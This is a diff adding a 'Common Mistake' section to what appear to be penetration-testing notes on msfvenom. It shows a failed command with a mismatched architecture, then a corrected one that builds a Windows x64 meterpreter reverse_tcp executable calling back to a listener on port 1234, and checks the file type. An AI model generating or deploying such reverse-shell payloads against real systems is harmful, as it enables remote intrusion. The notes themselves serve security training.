@@ -33,3 +33,32 @@ msfvenom -l payloads
 ```
 msfvenom -l payloads |
 ```
+
+## Common Mistake
+### 
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=1234 -a x64 -f exe -o rev64.exe           
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Error: The selected arch is incompatible with the payload
+```
+
+### 
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$myip lport=1234 -a x64 -f exe -o rev64.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev64.exe
+```
+
+### 
+```
+$ file rev64.exe 
+rev64.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
+```
+
+### 
+```
+
+```
